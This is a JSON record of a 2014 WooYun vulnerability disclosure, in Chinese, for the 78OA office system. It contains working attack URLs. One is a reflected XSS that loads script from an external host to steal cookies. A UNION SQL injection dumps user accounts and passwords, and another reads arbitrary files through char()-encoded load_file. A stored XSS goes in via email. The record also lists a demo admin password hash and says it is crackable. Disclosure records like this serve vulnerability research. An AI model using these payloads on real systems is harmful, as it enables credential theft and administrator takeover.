{"id": 1453, "wybug_id": "wooyun-2014-064785", "wybug_title": "78OA办公系统漏洞小礼包(反射存储xss以及sql注射)", "wybug_corp": "78oa.com", "wybug_author": "JJ Fly", "wybug_date": "2014-06-13 20:40", "wybug_open_date": "2014-09-11 20:42", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-11：\t细节向公众公开  简要描述： 78OA办公系统漏洞小礼包(反射,存储xss,sql) 详细说明：  首先先来官网下载一个最新的版本\nhttp://www.78oa.com/download/download42.html\n\n官方付费版试用地址  http://v4.78oa.com  帐号test1 密码 空\n这种oa系统，如果想要使用里面的功能。一般都要先有一个帐号。经过测试发现，貌似每一次安装的时候，都会生成一个随机post的key，在一些关键位置，都会提交。 所以csrf作为入口的方式放弃了。下面我们来尝试XSS(由于没有内部访问权限，只能尝试反射型xss)\nhttp://192.168.1.117/general/file_folder/private/list/index.php?sort_id=0&sort_parent=0&folder_type=1<script src=http://t.cn/*****></script>\n效果如下图\n\n拿到一个用户的cookies之后，我们尝试拿到管理员信息。Sql爆所有用户的帐号密码\nhttp://192.168.1.117/general/workflow/new/flow_graphic.php?flow_id=10049%20union%20select%203,4,USER_ID,PASSWORD,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26%20from%20user#\n\n\n详情可看源代码如果此处可以解得管理员密码最好，如果不行的话，我们只能继续深入了。官方演示站帐号 admin密码 0eb78ce180b2544ba047acba8e6acca6(可解密)\n\n读取任意文件\nhttp://192.168.1.117/general/workflow/new/flow_graphic.php?flow_id=10049%20union%20select%203,4,hex%28replace%28load_file%28char%2867,58,92,119,105,110,100,111,119,115,92,83,121,115,116,101,109,51,50,92,100,114,105,118,101,114,115,92,101,116,99,92,104,111,115,116,115%29%29,60,32%29%29,1,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26%20from%20user#\nChar(.....)代表的文件位置C:\\windows\\System32\\drivers\\etc\\hosts  （还可以用sqlmap进行读取）  查看源码，然后把相关内容进行16进制解密本地测试成功，体验站点测试失败。\n\n好吧继续上面的步骤。如果不能解密管理员的md5，那样的话，我们只能尝试别的了。在来一发存储行xss，指谁打谁。\n\n发送邮件那选择源码输入\n<SCRIPT/SRC=\"http://t.cn/*******\"></SCRIPT>\n然后发送\n\n拿到了管理员的cookies就可以自己去给自己添加一个超级管理员了 。   漏洞证明：  \n同上。\n   修复方案：  你们更专业。   版权声明：转载请注明来源 JJ Fly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-06-17 22:12 厂商回复： CNVD未直接复现，根据白帽子本地测试情况进行确认，由联系深圳市鑫星空软件有限公司0755-，需要实名转接，后发其公开邮箱，market  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-11 20:50 |    \t\twellsun \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | www.wellsun.com)\t\t \n  诚心诚信RMB收购乌云币~ 价格加Q谈：7520024 （加者备注）    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}